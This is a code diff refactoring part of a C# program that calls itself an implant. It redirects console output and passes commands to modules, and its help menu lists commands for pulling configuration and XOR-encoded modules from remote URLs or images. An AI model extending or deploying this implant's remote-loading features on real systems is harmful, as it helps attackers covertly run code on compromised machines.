@@ -26,6 +26,7 @@ namespace Application
             // adding default menu help
             menuhelp.Add("echo\t", "Echo a string for testing. (echo teststring)");
             menuhelp.Add("exit\t", "Exit from the implant (exit)");
+            menuhelp.Add("check-config", "Checks an implant config from a remote image (load-config HTTPURI XORKey)");
             menuhelp.Add("process-config", "Updates the implant config from a remote image (load-config HTTPURI XORKey)");
             menuhelp.Add("load-module", "Loads a XOR encoded module from file, URL or image (load-module file/url/image XORKey ModuleName filename/URI/ImageURI)");
 
@@ -34,20 +35,30 @@ namespace Application
                 {
                     Console.Write("# ");
                     string instructioninput = Console.ReadLine();
-                    RunInstruction(instructioninput,Console.Out);
+                    RunInstruction(instructioninput);
                 }
             }
         }
+        public static void ConsoleIOSet(TextWriter instructionIO)
+        {
+            Console.WriteLine("Console output is redirecting.");
+            try {
+                Console.SetOut(instructionIO);
+            }
+            catch (Exception e) {
+                Console.Error.WriteLine(e);
+            }
+            Console.WriteLine("Console output is set.");
+        }
 
-        public static void RunInstruction(string instructioninput, TextWriter instructionIO) {
+        public static void RunInstruction(string instructioninput) {       
             string instruction = Regex.Split(instructioninput," ")[0]; 
-            Console.SetOut(instructionIO);
             try
             {
                 // if instruction is in the extended menu
                 // send it to the loaded module
                 if (extmenu.ContainsKey(instruction)) {
-                    RunModuleInstruction(instructioninput, instructionIO);                        
+                    RunModuleInstruction(instructioninput);                        
                 }
                 else {
                     switch (instruction)
@@ -72,7 +83,7 @@ namespace Application
                             // process each line of config in the same menu
                             foreach (var c in Regex.Split(config,"\n"))
                             {
-                                RunInstruction(c,instructionIO);
+                                RunInstruction(c);
                             }
                             break;
                         case "check-config":
@@ -125,7 +136,7 @@ namespace Application
                         case "help":
                             // Help menu
                             Console.WriteLine("Command\t\tDescription"); 
-                            foreach (var m in Program.menuhelp)
+                            foreach (var m in menuhelp)
                             {
                                 Console.WriteLine("{0}\t{1}",m.Key, m.Value); 
                             }     
@@ -133,7 +144,7 @@ namespace Application
                         default:
                             // Help menu
                             Console.WriteLine("Command\t\tDescription"); 
-                            foreach (var m in Program.menuhelp)
+                            foreach (var m in menuhelp)
                             {
                                 Console.WriteLine("{0}\t{1}",m.Key, m.Value); 
                             }     
@@ -144,12 +155,11 @@ namespace Application
             }
             catch (Exception e)
             {
-                Console.WriteLine("Oh snap! " + e);
+                Console.Error.WriteLine("Oh snap! " + e);
             }
         }
 
-        public static void RunModuleInstruction(string userinput, TextWriter instructionIO) {
-            Console.SetOut(instructionIO);
+        public static void RunModuleInstruction(string userinput) {
 			Console.WriteLine("Finding the assembly and type for the instruction");
 			string instruction = Regex.Split(userinput," ")[0];			
 			Assembly a = modules[extmenu[instruction]];
